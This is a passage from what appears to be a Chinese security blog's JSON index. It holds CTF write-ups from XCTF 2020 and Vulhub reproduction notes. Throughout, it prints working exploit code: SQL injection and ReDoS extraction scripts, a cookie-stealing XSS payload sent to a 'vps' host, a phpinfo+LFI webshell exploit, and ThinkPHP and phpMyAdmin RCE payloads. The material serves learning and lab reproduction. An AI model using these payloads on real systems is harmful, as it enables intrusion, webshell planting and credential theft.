action=\"http://04bda212-e690-478a-99d5-846e353f75ca.node3.buuoj.cn/index.php\" method=\"POST\" enctype=\"multipart/form-data\"&gt; &lt;input type=\"hidden\" name=\"PHP_SESSION_UPLOAD_PROGRESS\" value=\"1\" /&gt; &lt;input type=\"file\" name=\"file\" /&gt; &lt;input type=\"submit\" /&gt; &lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 加上上面链子的payload.即可get_flag","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"WEB","slug":"WEB","permalink":"https://www.bycsec.top/tags/WEB/"},{"name":"PHP","slug":"PHP","permalink":"https://www.bycsec.top/tags/PHP/"}]},{"title":"XCTF高校战“疫”网络安全分享赛","slug":"XCTF高校战“疫”网络安全分享赛","date":"2020-03-10T08:52:33.000Z","updated":"2021-02-18T05:09:58.785Z","comments":true,"path":"2020/03/10/XCTF高校战“疫”网络安全分享赛/","link":"","permalink":"https://www.bycsec.top/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B/","excerpt":"萌新第一次xctf自闭了。第一次代表X1c打比赛，结果输出贼低，几乎就完整贡献一道题。有几道基本到位了也没做出来，没能分担队友压力…..但是最后队伍拿到第8名挺强的，其他师傅太给力了，中间有段时间还冲到了第四名，只不过大家因为要上课就都睡觉去了hhh。 所以趁着其他战队的wp出来自己先把几道自己当时接触了的题目以及没完整做出来的题目小结下。顺便提醒自己要加紧查漏补缺了。","text":"萌新第一次xctf自闭了。第一次代表X1c打比赛，结果输出贼低，几乎就完整贡献一道题。有几道基本到位了也没做出来，没能分担队友压力…..但是最后队伍拿到第8名挺强的，其他师傅太给力了，中间有段时间还冲到了第四名，只不过大家因为要上课就都睡觉去了hhh。 所以趁着其他战队的wp出来自己先把几道自己当时接触了的题目以及没完整做出来的题目小结下。顺便提醒自己要加紧查漏补缺了。 nweb这道题基本算是完整做出来了。只是考点有点坑。都知道有注入但是就是难找。实际上在注册页面有注释提醒type参数110时会不一样。并且之前登陆进去页面中有出题人提示的”注册账户也有等级之分”，所以可以在注册时就将type调为110。登陆进去就可以在search.php进行注入了。(但是这个区分点就很无语，没啥含金量，偏偏又能难倒一堆人) 进去后一个普通的盲注了。只不过过滤了关键字置为空，可以双写绕过。 12345678910111213141516171819202122import requestss=requests.session()url='http://121.37.179.47:1001/regist.php'url2='http://121.37.179.47:1001/login.php'url3='http://121.37.179.47:1001/search.php'flag=''s.post(url, data=&#123;'email': 'byc_409', 'pass': '123', 'repass': '123', 'type': '110'&#125;)for i in range(1,50): print(i) a=0 for j in range(32,128): s.post(url2, data=&#123;'email': 'byc_409', 'pass': '123'&#125;)#admin,fl4g,jd,user payload = \"1' or ascii(substr((selselectect group_concat(flag) frfromom fl4g),\"+str(i)+\",1))=\"+str(j)+\"#\" r = s.post(url3, data=&#123;'flag': payload&#125;) if 'no' not in r.text: flag+=chr(j) print(flag) a=1 break if a==0: break 注出来只能得到账号密码(md5)，加上一个只有一部分的flag。只能继续进后台了。由于之前扫目录得到过admin.html。直接登录，发现是个扫描器由于我前几天才接受的校队考核就是mysql load data infile的知识点，加上跑出来的flag是mysql-rogue-server，马上就能想到使用Mysql-Rogue-Server解决。解决方法很简单就是在服务器跑脚本就完了，但其实原理挺麻烦的。简单解释就是我们利用 load data infile的特性，可以用脚本伪造mysql传输数据包。只要这样就能返回服务器上的任意文件读取。不过这题python脚本不大行的样子，用php脚本解决问题，读flag.php就得到剩下的flag。 PHP-UAF这题基本没啥技术难度，主要就是跑脚本了。本来随便测测的，发现禁用系统函数以及一个open_basedir。那就看下目录吧，发现突然多了好多php文件，给师傅看看发现就是上次公益赛easy_thinking的bypass脚本https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php那就用就完事了。直接copy函数用了后包含一下命令执行即可。这题郁师傅随手做的，貌似因为搅屎原因刷了十几分钟才出来。至于为什么会搅屎，随便放一下比赛时读到的别队大佬php命令 easy_trick_gzmtu这题不想说啥了。就是坑。赛后看看Nu1l的解题脚本后，发现要用\\u\\n\\i\\o\\n \\s\\e\\l\\e\\c\\t这种语句。所以它源码应该是直接把参数time拿进函数date一把梭……….. 这谁想得到，真的无语。后面一个反序列化的trick,不想多说了。 好吧，官方wp里发现这题出题人搭在自己服务器上，来复现一波。注入不说了 123456789101112131415161718import requestsimport urllib.parseimport stringimport relet=string.ascii_lowercase+\"_.()\"exp=''payload=\"1' union select 1,(select group_concat(passwd) from admin),3#\"# /eGlhb2xldW5nfor ch in payload: if ch in let: ch=\"\\\\\"+ch exp+=chprint(exp)url='http://eqwerqwrfweryu.mycute.cn/?time='r=requests.get(url+urllib.parse.quote(exp))page=re.findall(r'&lt;div class=\"text-c \"&gt;(.*?)&lt;/div&gt;',r.text)[0]print(page) 然后一个ssrf读源码，file协议加localhost直接读。估计跟hgame week2那题一模一样的后端代码。根据提示读到某个重要php 1234567891011121314151617181920212223242526272829303132333435363738394041424344&lt;?phpclass trick&#123; public $gf; public function content_to_file($content)&#123; $passwd = $_GET['pass']; if(preg_match('/^[a-z]+\\.passwd$/m',$passwd)) &#123; if(strpos($passwd,\"20200202\"))&#123; echo file_get_contents(\"/\".$content); &#125; &#125; &#125; public function aiisc_to_chr($number)&#123; if(strlen($number)&gt;2)&#123; $str = \"\"; $number = str_split($number,2); foreach ($number as $num ) &#123; $str = $str .chr($num); &#125; return strtolower($str); &#125; return chr($number); &#125; public function calc()&#123; $gf=$this-&gt;gf; if(!preg_match('/[a-zA-z0-9]|\\&amp;|\\^|#|\\$|%/', $gf))&#123; eval('$content='.$gf.';'); $content = $this-&gt;aiisc_to_chr($content); return $content; &#125; &#125; public function __destruct()&#123; $this-&gt;content_to_file($this-&gt;calc()); &#125; &#125;unserialize((base64_decode($_GET['code'])));?&gt; 属实佩服出题人ascii码都能打错。上面一层换行符绕过password的校验a.passwd%0a20200202下面有点像php里的构造技巧可以用取反，也可以使用复杂的字符拼接flag大写ascii码的数字。exp 123456789101112131415&lt;?phpclass trick&#123; public $gf;&#125;&#x2F;*$abc&#x3D;&quot;FLAG&quot;;for($i&#x3D;0;$i&lt;&#x3D;strlen($abc);$i++)&#123; echo(ord($abc[$i]));&#125;*&#x2F;#70766571$o&#x3D;new trick();$o-&gt;gf&#x3D;&#39;~&#39;.~&#39;70766571&#39;;#~\\xC8\\xCF\\xC8\\xC9\\xC9\\xCA\\xC8\\xCEecho(base64_encode(serialize($o)));?&gt; sqlcheckin一个变种的万能密码，还居然是个原题。可惜没做过。语句很清晰 1$stmt = $pdo-&gt;prepare(\"SELECT username from users where username='$&#123;_POST['username']&#125;' and password='$&#123;_POST['password']&#125;'\"); 这次因为上面那道坑题又查了不少sql注入的资料，中间也学到了一个trick，比如此题payload: 1234admin&#39;-0-&#39; or &#39;^0^&#39; acdvvadva&#39; &amp;&#39;1 #前面随便一个字符串都可 实际就是利用了mysql里字符的特性。比如万能密码username=&#39;admin&#39;-0-&#39;&#39;里mysql会把admin转为数字，因为它跟数字运算了。如果这里0换成1相当于username=-1，属于错误。如果换成username=0则直接返回所有结果。同理，这个思路可以带到异或。进一步还可以用在某些过滤较多的盲注下，比如过滤了注释符号时的布尔盲注： 1234payload&#x3D;&#39;-(1&#x3D;1)-&#39; 布尔值假payload&#x3D;&#39;-(1&#x3D;0)-&#39; 布尔值真...payload&#x3D;&#39;-(length(database())&#x3D;12)-&#39; hackme最早做的一道题。其实思路蛮清晰的，但是后来没做了。其实有一部分原因是因为自己最后一步5字命令执行hitcon原题一直没做出来过。迷惑。开始是审计源码，在profile.php中发现有一个session.serialize_handler序列化处理器不同的问题。所以只要把序列化数据写进session并满足他this-&gt;admin=1的条件即可。这题提供了一个现成的可控参数。所以不需要像原来jarvisoj上做的一道题那样构造一个上传写入session.进入profile后可以看到源码是hitcon原题，但是前面加了一层过滤其实就是经典的filtervar+pregmatch之前曾经整理过ssrf的经典waf：https://www.jianshu.com/p/095f233cc9d5 12345678910111213141516171819&lt;?php echo \"Argument: \".$argv[1].\"\\n\"; // check if argument is a valid URL if(filter_var($argv[1], FILTER_VALIDATE_URL)) &#123; // parse URL $r = parse_url($argv[1]); print_r($r); // check if host ends with google.com if(preg_match('/google\\.com$/', $r['host'])) &#123; // get page from URL exec('curl -v -s \"'.$r['host'].'\"', $a); print_r($a); &#125; else &#123; echo \"Error: Host not allowed\"; &#125; &#125; else &#123; echo \"Error: Invalid URL\"; &#125;?&gt; 当时payload是0://evil.com:80;google.com:80但是此题其实跟bytectf的boringcode更像。幸好自己比赛前几天才复现过。具体细节上就是将host的google改为baidu，加了一层data协议的过滤。以及ssrf方式变为file_get_contents()注意，原本curl的时候我们是有多解的。但是ssrf换成file_get_contents()请求只有一种普遍的方式就是data://google.com/plain;base64,SSBsb3ZlIFBIUAo=host后的内容直接以路径绕过。并且作为请求内容输出。此题过滤了data，与bytectf一致。当时我看到boringcode这题很多战队解决方法是购买域名绕过对host的限制。除此之外还有说用baidu302跳转的，这里显然不行；有说用ftp协议的，我试过也不行。当时还剩下一种解决方法我试了一下发现可以，就是compress.zlib://data:@baidu.com/baidu.com?,echo(scandir(&#39;.&#39;));而且直接从路径获取内容比另一种方法简单许多。 所以此题直接使用这一方法就能绕过校验了。compress.zlib://data:@127.0.0.1/plain;base64,后面hitcon的内容不多说。我觉得自己虽然orange的脚本用不出来，其他方法说不定可以。比如把里面的命令换成curl vps ip &gt; a.php写入一句话。 happyvacation有意思的题目，就是我payload几乎都完成了结果没做出来。泪流满面。开始第一天发现是个CSP,加上有个文件上传点。直接就猜是xss+cspbypass。结果试了下发现个别参数一堆过滤还有没找到xss的点。第二天才知道有git源码泄露，立马原地复活。比赛时整理的要点 123456789101112131.$message可控，绕过preg_match&#39;&#x2F;coo|&lt;|ja|\\&amp;|\\\\\\|&gt;|win&#x2F;i&#39;后addslashes后存储起来然后showmessage()里调用了echo &quot;&lt;body&gt;&lt;script&gt; var a &#x3D; &#39;&#123;$this-&gt;info-&gt;message&#125;&#39;;document.write(a);&lt;&#x2F;script&gt;&lt;&#x2F;body&gt;&quot;;2.$answer可控绕过preg_match &quot;&#x2F;[^a-zA-Z_\\-&#125;&gt;@\\]*]&#x2F;i&quot;跟&#x2F;f|sy|and|or|j|sc|in&#x2F;i拼接进eval(eval(&quot;\\$this-&gt;&quot;.$answer.&quot; &#x3D; false;&quot;);)3.$referer可控跳转4.文件上传禁了[&#39;ph&#39;, &#39;ht&#39;, &#39;sh&#39;, &#39;pe&#39;, &#39;j&#39;, &#39;&#x3D;&#39;, &#39;co&#39;, &#39;\\\\&#39;, &#39;&quot;&#39;, &#39;\\&#39;&#39;] 这里CSP写的很基本，就是个允许同源脚本，而且开放了unsafe-inline。这种给了文件上传的js就是白给。CSP轻松解决。现在关键是waf。$message是传打xss的语句的。但是过了一层addslashes后被写入语句，意味着必须要解决宽字符的问题。这里如果是常规方法可以在里面再写一个script内容绕过。可是标签被过滤了。只能考虑其他方法。 $answer应该是要利用的，最终可以实现一个eval语句，但是严格限制我们只能将某个属性置为false。 lib.php可以看见一段关键函数 12345678910111213141516171819function go()&#123; if(isset($this-&gt;pre) and isset($this-&gt;after) and isset($this-&gt;location))&#123; $dest = $this-&gt;pre . $this-&gt;location . $this-&gt;after; header($dest); &#125; else&#123; // Error occured? header(\"Location: index.php\"); &#125;&#125;function __destruct()&#123; if($this-&gt;flag)&#123; if($this-&gt;location !== $this-&gt;page)&#123; $this-&gt;go(); &#125; &#125; ob_end_flush();&#125; 一个destruct方法，在flag为true时会调用go，然后，go很奇妙的拼接了三个参数进行header()设计。那么是否只要我们把header控制为gbk编码，就可以解决前面xss被转义的问题呢？没错。所以这里就是入手点。转而跟进下关键函数。 1234if($user-&gt;url-&gt;referer !&#x3D; $user-&gt;url-&gt;page)&#123; $user-&gt;url-&gt;location &#x3D; $user-&gt;url-&gt;referer; &#125; $user-&gt;url-&gt;flag &#x3D; True; 首先，传值answer时就会进行flag=1赋值，同时location参数会赋值为我们可控的referer。那么我们的目标变成通过referer控制header。为此就要解决pre这个拼接的属性。这时我们前面的eval语句就起作用了。如果把this-&gt;pre设为false,在拼接时它就会变成空。那么我们的可控参数location直接传进header。既然如此，payload就可以构造了： 1&#x2F;?answer&#x3D;user-&gt;url-&gt;pre&amp;referer&#x3D;Content-Type:text&#x2F;html; charset&#x3D;GBK;abc&#x3D; 此处随便用abc之类的拼接下后面的this-&gt;after属性值.php。这样我们的index.php终于可以打xss了，可以逃逸单引号。 1&#x2F;index.php?message&#x3D;%c0%27; alert(1);&#x2F;&#x2F; 现在想来我比赛时就是这么打的。但是alert(1)没成，我以为是payload问题就没继续做了…….现在想想实在是拉胯，这个payload就没问题啊，估计是我哪里细节有问题啊，应该继续做下去的，草。然后就是常规问题了，为了解决没有单引号的问题使用string.fromCharCode，这个我也预先想好了这样写payload，居然因为提前放弃没用出来，该打。然后就可以加载内联脚本了。同样很简单，因为CSP的原因吧src设置成上传文件路径即可。这里我看梅子酒学长的文章介绍的是用.wave文件bypassCSP的。不过之前看过文章介绍过jpeg或者其他文件bypassCSP也是可行的。不过需要设计一下文件头。所以payload构造下：上传图片内容 1aaaaaaaaaaaaaaa&#x2F;*bbbbbbbbbbbbbbbbbbb*&#x2F;&#x3D;&#39;test&#39;;window.open(&#39;http:&#x2F;&#x2F;vps:port&#x2F;?&#39;+document.cookie); index.php构造message 1234%c0%27; var x=document.createElement('script');x.src='/upload/xxxxx/test.wave'document.body.appendChild(x);// 最后payload转一下charcode应该就行了。 这里再膜一下星盟跟Nu1L等等战队的师傅们，整了个巨简单的非预期。上面eval覆盖的地方由于前面调用了一个clone，所以相当于是个新的user。这样的话user的属性都可以改。由于源码所有功能都在user类实现的，那就是任意属性都可改。直接把黑名单覆盖成false.然后上传phpgetshell。flag在根目录……郁师傅最后也跟我说这个思路，我开始还不敢信。结果真能整成非预期。可惜后来被修复了。 不说了，比赛没做出来太遗憾了。有复现环境的话一定去复现。 guessgame先扔一个源码审完就出的payload 1&#123;&quot;user&quot;: &#123;&quot;username&quot;:&quot;admın888&quot;, &quot;__proto__&quot;: &#123;&quot;enableReg&quot;: True&#125;&#125;&#125;) 主要是一个js大写的绕过，上次公益CTF做过了。然后是一个调用了merge的原型链污染。也是为了进下面这个if。 1234if(config.enableReg &amp;&amp; noDos(regExp) &amp;&amp; flag.match(regExp))&#123; //res.end(flag); //Stop your wishful thinking and go away! &#125; 后面要跑flag，用的是正则盲注。打扰了，环境一个个卡的一比。我也不知道怎么注，等一手官方wp吧。看到别队思路了，可以学下。原来noDos这个正则就是要利用的。因为是个正则匹配，而javascript正则的回溯机制会让恶意代码使服务端大量占用服务内存。比如一个/ˆa*a*b$/，用aaaaaaaaaaaaa就可以让其多次回溯，达成js的re(正则)dos攻击。所以本题目的就是让nodos被我们的可控q卡住，然后前面已经原型链污染达成if的一个真值了，剩下的相当于盲注flag使if第三个值达成真值。 12 g3t(((((.*)+)+)+)+)! (((((.*)+)+)+)+)Y 类似如此的payload不断fuzz。 3.13：今天把题目复现了一下，用的出题人的脚本做了做。顺便理解了下reDOS盲注的基本概念。当然要跟出题人点赞，这题算是头一次考察了reDOS的知识点，可惜因为靶机原因不能保证选手们正常解题。如果单独下发容器应该会更稳定。关于知识点:说起来其实不难。reDOS首先需要明确的是：使用了js的NFA作为正则引擎。NFA，即非确定有限状态自动机。其实，之前在p牛的pcrewaf这一题目中就已经提及了NFA的特性。它正则匹配时出现的回溯机制将会产生大量危害。对php而言是回溯次数有限导致bypass。对作为服务端的js而言，则是占用大量系统资源。之前曾看到国外大佬写的一个正则，可以让一次js的正则匹配占用高达%99的内存。 回到这一知识点，来看解题的主要正则 1^(?&#x3D;(some regexp here))((.*)*)*salt$ 简单解释，只要我们所需要的SECRET(本题是flag)与中间的regexp部分相匹配，整个正则将导致整个匹配过程延时到2秒多的时间。既然如此，只要能通过构造正则表达式来注入，将达到跟sql时间盲注一样的效果，得到进行正则匹配的flag附上出题人的exp: 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import socketimport sysimport timeimport randomimport stringimport requestsimport re# constantsTHRESHOLD = 2# predicatesdef length_is(n): return \".&#123;\" + str(n) + \"&#125;$\"def nth_char_is(n, c): return \".&#123;\" + str(n-1) + \"&#125;\" + re.escape(c) + \".*$\"# utilitiesdef redos_if(regexp, salt): return \"^(?=&#123;&#125;)((((.*)*)*)*)*&#123;&#125;\".format(regexp, salt)def get_request_duration(payload): try: _start = time.time() requests.post(\"http://vps:port/verifyFlag\", &#123;\"q\": payload&#125;) _end = time.time() duration = _end - _start except: duration = -1 exit(1) return durationdef prop_holds(prop, salt): return get_request_duration(redos_if(prop, salt)) &gt; THRESHOLDdef generate_salt(): return ''.join([random.choice(string.ascii_letters) for i in range(10)])if __name__ == '__main__': salt = \"!\" # generate_salt() # leak length upper_bound = 15 secret_length = 0 for i in range(0, upper_bound): if prop_holds(length_is(i), salt): secret_length = i print(\"[+] length: &#123;&#125;\".format(secret_length)) S = \"qwdfkjurlasetghnioyzxcvbpmQWDFKJURLASETGHNIOYZXCVBPM1234567890\" secret = \"\" for i in range(0, secret_length): for c in S: if prop_holds(nth_char_is(i+1, c), salt): secret += c print(\"[*] &#123;&#125;\".format(secret)) print(\"[+] secret: &#123;&#125;\".format(secret)) 参考了出题人的参考文章：https://diary.shift-js.info/blind-regular-expression-injection/?tdsourcetag=s_pctim_aiomsg 比赛其他题目主要是队友做的，基本没怎么看。到时候有机会去研究下。然后就是反思了。现在水平还太菜，赶紧多花点时间学学知识刷刷题。不然再菜的抠脚就丢人了。","categories":[],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://www.bycsec.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://www.bycsec.top/tags/wp/"}]},{"title":"To-Dolist","slug":"To-Dolist","date":"2020-03-09T03:29:58.000Z","updated":"2021-02-18T05:09:50.713Z","comments":true,"path":"2020/03/09/To-Dolist/","link":"","permalink":"https://www.bycsec.top/2020/03/09/To-Dolist/","excerpt":"第一次 XCTF 就自闭了。最难受的就是队友辛苦付出，自己却基本没啥输出……之前公益赛还以为有了一定水准，现在看还差得远啊。所以一定要一定要尽快把能力提升起来，刷题固然重要，知识点也不能落下。这次比赛打下来发现自己居然只能在sql跟Node.js下手，太嘲讽了。把近期一些需要彻底弄懂的知识点列一下，总有一天要全部解决。","text":"第一次 XCTF 就自闭了。最难受的就是队友辛苦付出，自己却基本没啥输出……之前公益赛还以为有了一定水准，现在看还差得远啊。所以一定要一定要尽快把能力提升起来，刷题固然重要，知识点也不能落下。这次比赛打下来发现自己居然只能在sql跟Node.js下手，太嘲讽了。把近期一些需要彻底弄懂的知识点列一下，总有一天要全部解决。 PHPphp的一些trick写shell;命令执行;bypass技巧 php反序列化主要是pop链的构造。简单的当然会。难的就容易拉胯。说白了就是自己审计能力差。最好把trick都搞清楚。然后再把下面的框架的pop链弄一弄 tp框架5.0 6.0Laravel框架pythonpython反序列化这次反序列化吃了大亏。现学都好多看不进去。既然如此那就力求线下弄明白。主要是底层的原理 Flask框架问题。想做还是得会开发。 开发的多线程什么的。写脚本省时间。py3跟py2一些脚本的差别 javajava反序列化好歹自己有java基础。不接触下java漏洞太浪费那一点java知识了。 spel注入javawebtomcat javascriptxss csp老早看过比较完整的却没总结。赶紧总结一波。 sqli唯一比较自信的一项。结果比赛第一题还是不会做。万能密码也差点没弄出来。 之前总结的trick可能需要再细分一下。 其他的vulhub在复现了,争取再多复现一些题目。 CSRF，CRLF，争取多找些题目做; 渗透学到的知识也是可以总结下的WEB还有好多基础没打牢。找时间补一补。 屡败屡战才是一个CTFer的作风。现在既然选择这条路就加油干下去吧。","categories":[],"tags":[]},{"title":"Vulhub复现","slug":"Vulhub复现","date":"2020-03-06T08:04:04.000Z","updated":"2021-02-18T05:09:53.910Z","comments":true,"path":"2020/03/06/Vulhub复现/","link":"","permalink":"https://www.bycsec.top/2020/03/06/Vulhub%E5%A4%8D%E7%8E%B0/","excerpt":"p牛参与的项目vulhub,对于web安全从事人员而言应该说是宝库般的存在。里面许多的漏洞都是值得一一去学习的。在此感谢那些大佬为项目作出的付出。才让我们能够轻松复现题目。环境从github上获取。环境搭建只需docker-compose up -d","text":"p牛参与的项目vulhub,对于web安全从事人员而言应该说是宝库般的存在。里面许多的漏洞都是值得一一去学习的。在此感谢那些大佬为项目作出的付出。才让我们能够轻松复现题目。环境从github上获取。环境搭建只需docker-compose up -d phpinfo+lfi=shell首先说明。这是一个无视php版本的漏洞。因此可见其通用性。vulhub上提供的php7的环境，以及一个lfi.php页面执行文件包含，一个phpinfo.php执行phpinfo。 漏洞原理： 首先，漏洞的操作顺序是：获取phpinfo中的临时文件名 –&gt; 对临时文件进行包含 –&gt; phpinfo页面执行结束，销毁临时文件。所以如果我们让phpinfo的执行时间足够大，我们的文件包含就有足够时间执行。从而产生一个永久的shell。所以利用时，使用的是原生的socket数据，往phpinfo中填充垃圾信息。php的默认缓冲区大小为4096个字节，就相当于php每次返回4096个字节给socket连接。这样，当我们获取到临时文件名时，就立即发送文件包含请求。就能执行命令并写入shell了。使用vulhub上的exp脚本: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190#!/usr/bin/python import sysimport threadingimport socketdef setup(host, port): TAG=\"Security Test\" PAYLOAD=\"\"\"%s\\r&lt;?php file_put_contents('/tmp/g', '&lt;?=eval($_REQUEST[1])?&gt;')?&gt;\\r\"\"\" % TAG REQ1_DATA=\"\"\"-----------------------------7dbff1ded0714\\rContent-Disposition: form-data; name=\"dummyname\"; filename=\"test.txt\"\\rContent-Type: text/plain\\r\\r%s-----------------------------7dbff1ded0714--\\r\"\"\" % PAYLOAD padding=\"A\" * 5000 REQ1=\"\"\"POST /phpinfo.php?a=\"\"\"+padding+\"\"\" HTTP/1.1\\rCookie: PHPSESSID=q249llvfromc1or39t6tvnun42; othercookie=\"\"\"+padding+\"\"\"\\rHTTP_ACCEPT: \"\"\" + padding + \"\"\"\\rHTTP_USER_AGENT: \"\"\"+padding+\"\"\"\\rHTTP_ACCEPT_LANGUAGE: \"\"\"+padding+\"\"\"\\rHTTP_PRAGMA: \"\"\"+padding+\"\"\"\\rContent-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\\rContent-Length: %s\\rHost: %s\\r\\r%s\"\"\" %(len(REQ1_DATA),host,REQ1_DATA) #modify this to suit the LFI script LFIREQ=\"\"\"GET /lfi.php?file=%s HTTP/1.1\\rUser-Agent: Mozilla/4.0\\rProxy-Connection: Keep-Alive\\rHost: %s\\r\\r\\r\"\"\" return (REQ1, TAG, LFIREQ)def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag): s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host, port)) s2.connect((host, port)) s.send(phpinforeq) d = \"\" while len(d) &lt; offset: d += s.recv(offset) try: i = d.index(\"[tmp_name] =&amp;gt; \") fn = d[i+17:i+31] except ValueError: return None s2.send(lfireq % (fn, host)) d = s2.recv(4096) s.close() s2.close() if d.find(tag) != -1: return fncounter=0class ThreadWorker(threading.Thread): def __init__(self, e, l, m, *args): threading.Thread.__init__(self) self.event = e self.lock = l self.maxattempts = m self.args = args def run(self): global counter while not self.event.is_set(): with self.lock: if counter &gt;= self.maxattempts: return counter+=1 try: x = phpInfoLFI(*self.args) if self.event.is_set(): break if x: print \"\\nGot it! Shell created in /tmp/g\" self.event.set() except socket.error: return def getOffset(host, port, phpinforeq): \"\"\"Gets offset of tmp_name in the php output\"\"\" s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) s.connect((host,port)) s.send(phpinforeq) d = \"\" while True: i = s.recv(4096) d+=i if i == \"\": break # detect the final chunk if i.endswith(\"0\\r\\n\\r\\n\"): break s.close() i = d.find(\"[tmp_name] =&amp;gt; \") if i == -1: raise ValueError(\"No php tmp_name in phpinfo output\") print \"found %s at %i\" % (d[i:i+10],i) # padded up a bit return i+256def main(): print \"LFI With PHPInfo()\" print \"-=\" * 30 if len(sys.argv) &lt; 2: print \"Usage: %s host [port] [threads]\" % sys.argv[0] sys.exit(1) try: host = socket.gethostbyname(sys.argv[1]) except socket.error, e: print \"Error with hostname %s: %s\" % (sys.argv[1], e) sys.exit(1) port=80 try: port = int(sys.argv[2]) except IndexError: pass except ValueError, e: print \"Error with port %d: %s\" % (sys.argv[2], e) sys.exit(1) poolsz=10 try: poolsz = int(sys.argv[3]) except IndexError: pass except ValueError, e: print \"Error with poolsz %d: %s\" % (sys.argv[3], e) sys.exit(1) print \"Getting initial offset...\", reqphp, tag, reqlfi = setup(host, port) offset = getOffset(host, port, reqphp) sys.stdout.flush() maxattempts = 1000 e = threading.Event() l = threading.Lock() print \"Spawning worker pool (%d)...\" % poolsz sys.stdout.flush() tp = [] for i in range(0,poolsz): tp.append(ThreadWorker(e,l,maxattempts, host, port, reqphp, offset, reqlfi, tag)) for t in tp: t.start() try: while not e.wait(1): if e.is_set(): break with l: sys.stdout.write( \"\\r% 4d / % 4d\" % (counter, maxattempts)) sys.stdout.flush() if counter &gt;= maxattempts: break print if e.is_set(): print \"Woot! \\m/\" else: print \":(\" except KeyboardInterrupt: print \"\\nTelling threads to shutdown...\" e.set() print \"Shuttin' down...\" for t in tp: t.join()if __name__==\"__main__\": main() 最后即可在lfi页面达成任意命令执行 1&#x2F;lfi.php?file&#x3D;&#x2F;tmp&#x2F;g&amp;1&#x3D;system(&#96;ls&#96;); XDebug rceXDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置remote_connect_back = 1这个配置下，我们访问http://target/index.php?XDEBUG_SESSION_START=phpstorm,目标服务器的XDebug将会连接访问者的IP（或X-Forwarded-For头指定的地址）并通过dbgp协议与其通信，我们通过dbgp中提供的eval方法即可在目标服务器上执行任意PHP代码。(类似于之前的java jdwp,都是一个调试模式，同时监听了指定端口，让我们可以利用命令执行)在漏洞环境phpinfo中可以看到xdebug的配置进而找到xdebug开启使用脚本，注意需要python3,同时要运行在有公网ip的机器上。 1python3 exp.py -t http:&#x2F;&#x2F;ip:port&#x2F;index.php -c &#39;system(&#39;id&#39;);&#39; 因为脚本实际上实现的是监听本地9000端口并等待xdebug的连接。因此要么处于同一内网，要么自己有公网ip. php-fpm Fastcgi具体使用在之前的NCTF2019 phar matches everything 中已经用过了。由于PHP-FPM默认监听9000端口，如果这个端口暴露在公网，则我们可以自己构造fastcgi协议，和fpm进行通信而fpm中有一个重要的环境变量参数，SCRIPT_FILENAME。只要它是一个服务器上存在的文件，就可以执行php文件。已知原理后，后面实现其实就不难了。我们可以通过协议执行任意文件。既然如此，只要执行一个auto_prepend_file为php://input并开启allow_url_include = On。它在执行任意php文件时都会把我们post的内容带进去。进而达到任意命令执行。 1python exp.py ip /usr/local/lib/php/PEAR.php -p 9000 -c '&lt;?php echo `id`;exit();?&gt;' phpmyadmin 4.8.1 远程文件包含漏洞CVE-2018-12613。之前曾经在广外的比赛做过。应该说有许多种getshell方式，只不过各有千秋吧。主要漏洞出在db_sql.php,由于里面一个urlencode函数的使用，所以可以通过二次编码绕过并文件包含。target=db_sql.php%253f/../../../../../../../../etc/passwd进一步可以getshell直接执行sql语句 1select &#96;&lt;?&#x3D;phpinfo();?&gt;&#96;; 访问自己的session缓存文件 1target&#x3D;db_sql.php%253f&#x2F;....&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;tmp&#x2F;sess_ce21bdd74738d8aaff45c82288addcb7 所以当然可以执行sql语句select &#39;&lt;?php @eval($_GET[&quot;byc&quot;]);?&gt;&#39;写入一句话并包含 1?target&#x3D;db_sql.php%253f&#x2F;....&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;.&#x2F;tmp&#x2F;sess_43a49651429f0e100e0d55c016f338b5&amp;byc&#x3D;system(%27ls%27); 貌似之前听说这个版本只能用get的一句话，所以还是写get的一句话就好。 ThinkPHP RCEThinkPHP5 5.0.22/5.1.29大致看了下，貌似是因为命名空间的符号使用导致我们可以调用任意类payload 1?s&#x3D;&#x2F;Index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;-1 可以直接rce&amp;vars[0]=system&amp;vars[1][]=ls也可以写一个shell.php 1?s&#x3D;&#x2F;Index&#x2F;\\think\\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell.php&amp;vars[1][]&#x3D;&lt;%3fphp+%40eval(%24_GET%5b%27byc%27%5d)%3b%3f&gt; ThinkPHP5 5.0.23也是比较常见的一个版本 12345GET:?s&#x3D;captchaPOST:_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;whoami TomcatGhostcat CVE-2020-1938幽灵猫。这里的环境只提供了文件读取. 1python3 ajpShooter.py http://vpsip/ 8009 /WEB-INF/web.xml read 想要进行RCE还需要一个文件上传点。这里直接进入容器增加一个exp.jspdocker exec -it 容器id /bin/bash没有vim.用curl搞来一个exp.jsp到/WEB-INF下 12345678910111213&lt;%@ page import=\"java.util.*,java.io.*\"%&gt;&lt;% 